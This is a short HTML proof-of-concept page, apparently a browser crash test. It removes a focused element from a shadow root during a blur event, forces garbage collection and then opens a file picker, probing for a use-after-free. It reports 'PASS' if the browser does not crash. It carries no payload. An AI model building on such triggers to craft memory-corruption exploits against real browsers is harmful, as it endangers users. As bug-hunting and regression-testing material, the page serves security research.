<!DOCTYPE html>
<html>
<body>
<p>PoC 9 - file picker</p>
<div id="host"></div>
<input type="file" id="file">
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    file.focus();
    file.click();          // abre o seletor de arquivo
    setTimeout(() => {
        result.textContent = 'PASS (não crashou)';
    }, 300);
}, 100);
</script>
</body>
</html>
